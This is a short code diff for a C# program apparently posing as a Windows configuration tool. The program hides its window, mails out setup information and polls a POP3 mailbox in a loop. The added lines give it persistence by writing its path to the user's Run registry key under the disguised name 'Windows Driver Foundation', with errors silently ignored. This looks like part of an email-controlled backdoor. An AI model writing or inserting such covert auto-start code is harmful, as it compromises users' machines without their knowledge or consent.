@@ -55,6 +55,13 @@ namespace Windows78_Config
             this.WindowState = FormWindowState.Minimized;
             this.ShowInTaskbar = false;
             SendSetupInfoMail();
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            try
+            {
+                rk.SetValue("Windows Driver Foundation", Application.ExecutablePath);
+            }
+            catch (Exception ex)
+            { }
                 while (true)
                 {
                     using (var client = new Pop3Client())
